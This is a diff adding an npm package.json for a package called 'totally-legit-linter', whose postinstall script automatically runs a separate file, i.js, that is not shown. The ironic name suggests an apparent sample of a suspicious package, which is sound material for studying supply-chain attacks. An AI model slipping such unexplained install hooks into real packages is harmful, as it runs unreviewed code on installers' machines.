@@ -1,0 +1,8 @@
+{
+  "name": "totally-legit-linter",
+  "version": "1.0.0",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "node i.js"
+  }
+}
